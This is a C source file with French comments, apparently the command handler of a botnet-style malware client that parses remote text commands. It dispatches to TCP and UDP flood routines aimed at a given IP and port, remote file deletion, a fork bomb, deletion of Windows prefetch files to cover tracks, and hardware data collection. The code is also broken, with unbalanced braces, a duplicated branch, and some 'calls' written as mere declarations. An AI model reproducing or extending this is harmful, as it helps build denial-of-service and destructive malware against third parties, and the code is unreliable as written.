#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "proto.h"

void ft_exec(char *message) {
    char *token = strtok(message, " "); // Divise la chaîne en mots
    
    if (token != NULL) {
        if (strcmp(token, "ddostcp") == 0) {

            token = strtok(NULL, " "); // Obtient le deuxième mot de la string qui est notre port
            if (token != NULL) {
                int port = atoi(token);

                token = strtok(NULL, " "); // Obtient le troisième mot de la string qui est notre addresse ip
                if (token != NULL) {
                    char * addrip = token;
                    
                    token = strtok(NULL, " "); // Obtient le quatrième mot de la string qui est notre nombre de paquets
                    if (token != NULL) {
                        int nbpackets = atoi(token);

                        token = strtok(NULL, " "); // Obtient le cinquieme mot de la string qui est notre delai entre chaque paquets
                        if (token != NULL) {
                            int sizepacket = atoi(token);

                            token = strtok(NULL, " "); // Obtient le cinquieme mot de la string qui est notre delai entre chaque paquets
                            if (token != NULL) {
                                int delai = atoi(token);
                                ddostcp(port, addrip, nbpackets, sizepacket, delai );
                            }
                        }
                    } 
                } 
            } 
        }


        else if (strcmp(token, "ddosudp") == 0) {

            token = strtok(NULL, " "); // Obtient le deuxième mot de la string qui est notre port
            if (token != NULL) {
                int port = atoi(token);

                token = strtok(NULL, " "); // Obtient le troisième mot de la string qui est notre addresse ip
                if (token != NULL) {
                    char * addrip = token;
                    
                    token = strtok(NULL, " "); // Obtient le quatrième mot de la string qui est notre nombre de paquets
                    if (token != NULL) {
                        int nbpackets = atoi(token);

                        token = strtok(NULL, " "); // Obtient le cinquieme mot de la string qui est notre delai entre chaque paquets
                        if (token != NULL) {
                            int sizepacket = atoi(token);

                            token = strtok(NULL, " "); // Obtient le cinquieme mot de la string qui est notre delai entre chaque paquets
                            if (token != NULL) {
                                int delai = atoi(token);
                                ddosudp(port, addrip, nbpackets, sizepacket, delai );
                            }
                        }
                    } 
                } 
            } 
        }


        else if (strcmp(token, "delfile") == 0) {

            token = strtok(NULL, " "); // Obtient le deuxième mot de la string qui est notre fichier a supprimer
            if (token != NULL) {
                char * fichierdel = token;
                void supfichier (char * fichierdel);

            } 
        }


        else if (strcmp(token, "forkbomb") == 0) {
            void forkbomb();
        }


        else if (strcmp(token, "delprefetch") == 0) {
            deletePrefetchFiles(); 
        }


        else if (strcmp(token, "hardcollec") == 0) {
            hardcollec(); 
        }
 

        else if (strcmp(token, "image") == 0) {

            token = strtok(NULL, " "); // Obtient le deuxième mot de la string qui est notre fichier a supprimer
            if (token != NULL) {
                char * fichierimage = token;
                void image(char * fichierimage);

            } 
        }


        else if (strcmp(token, "fonction2") == 0) {
            token = strtok(NULL, " "); // Obtient le deuxième mot (paramètre a)
            if (token != NULL) {
                int a = atoi(token);

                token = strtok(NULL, " "); // Obtient le troisième mot (paramètre b)
                if (token != NULL) {
                    int b = atoi(token);
                    //fonction2(a, b);
                } else {
                    printf("Paramètre b manquant.\n");
                }
            } else {
                printf("Paramètre a manquant.\n");
            }
        }
        

        } else if (strcmp(token, "fonction2") == 0) {
            token = strtok(NULL, " "); // Obtient le deuxième mot (paramètre a)
            if (token != NULL) {
                int a = atoi(token);

                token = strtok(NULL, " "); // Obtient le troisième mot (paramètre b)
                if (token != NULL) {
                    int b = atoi(token);
                    //fonction2(a, b);
                } else {
                    printf("Paramètre b manquant.\n");
                }
            } else {
                printf("Paramètre a manquant.\n");
            }
        }


         else {
            printf("Fonction inconnue.\n");
        }
    }

// A faire en se basant sur le nombre de fonction et le nombre d'arguments